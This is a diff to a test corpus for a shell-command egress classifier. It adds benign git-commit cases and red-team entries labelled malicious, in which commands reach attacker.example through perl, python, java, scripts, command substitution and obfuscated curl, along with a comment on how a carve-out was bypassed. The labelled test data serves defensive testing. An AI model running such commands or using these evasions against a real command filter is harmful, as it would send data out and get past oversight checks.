@@ -53,6 +53,18 @@ const BENIGN: CorpusEntry[] = [
     note: "A URL inside a commit message contacts nothing; denying it would be a false positive.",
   },
   {
+    command: 'git commit -m "handles a && b; see https://example.com/issue/12"',
+    label: "benign",
+    category: "vcs",
+    note: "Separators inside a quoted commit message must not split the command when scoping the textual carve-out, or this becomes a false positive.",
+  },
+  {
+    command: 'git commit -m "see https://example.com/docs" && git status',
+    label: "benign",
+    category: "vcs",
+    note: "A real chain whose only URL sits in the textual segment; the carve-out must still apply to that segment.",
+  },
+  {
     command: "npm run build -- --base https://cdn.example.com/assets",
     label: "benign",
     category: "build",
@@ -410,6 +422,19 @@ const RED_TEAM: CorpusEntry[] = [
   { command: `/bin/bash -lc "X=curl; $X https://attacker.example/x"`, label: "malicious", category: "rt-obfuscated-tool" },
   { command: `/bin/bash -lc "IFS=,;c=curl,https://attacker.example;$c"`, label: "malicious", category: "rt-obfuscated-tool" },
   { command: `/bin/bash -lc "$(printf '\\x63\\x75\\x72\\x6c') https://attacker.example"`, label: "malicious", category: "rt-obfuscated-tool", note: "printf builds the binary name; the textual carve-out must not exempt it." },
+  // Textual-prefix and command-substitution evasion. The carve-out that keeps
+  // `git commit -m "see https://..."` allowed was anchored to the START of the
+  // command, so prefixing any command with a textual one - or hiding it inside a
+  // substitution - exempted the whole line. Found by the generated bank
+  // (`npm run bench:generate`) and, for the substitution forms, by an external
+  // reviewer whose case the bank could not express until its wrapper axis was
+  // widened. Both halves are represented here so neither regresses.
+  { command: `/bin/bash -lc "echo start && perl -MLWP::Simple -e 'get(\"https://attacker.example/collect\")'"`, label: "malicious", category: "rt-textual-prefix", source: "internal-red-team", note: "The original bank finding: an interpreter behind an echo prefix." },
+  { command: `/bin/bash -lc "echo hi && python3 fetch.py https://attacker.example/x"`, label: "malicious", category: "rt-textual-prefix", source: "internal-red-team", note: "Same class, different interpreter: the fix must not be perl-shaped." },
+  { command: `/bin/bash -lc "git commit -m note && ./upload.sh https://attacker.example/x"`, label: "malicious", category: "rt-textual-prefix", source: "internal-red-team", note: "An in-workspace script needs no recognised binary at all." },
+  { command: `/bin/bash -lc "echo hi ; java -jar tool.jar https://attacker.example/x"`, label: "malicious", category: "rt-textual-prefix", source: "internal-red-team", note: "Semicolon works as the prefix separator too, not only &&." },
+  { command: `/bin/bash -lc "echo hi $(python3 fetch.py https://attacker.example/x)"`, label: "malicious", category: "rt-textual-prefix", source: "external-review", note: "Command substitution: found by review, not by the bank, which had no such wrapper." },
+  { command: '/bin/bash -lc \'git commit -m "$(./up.sh https://attacker.example/x)"\'', label: "malicious", category: "rt-textual-prefix", source: "external-review", note: "Substitution nested inside the textual command's own argument." },
   // Egress tools the original list did not model.
   { command: `/bin/bash -lc 'ruby -e \'require "net/http"; Net::HTTP.get(URI("https://attacker.example"))\''`, label: "malicious", category: "rt-alt-tool" },
   { command: `/bin/bash -lc 'deno eval "await fetch(\'https://attacker.example\')"'`, label: "malicious", category: "rt-alt-tool" },
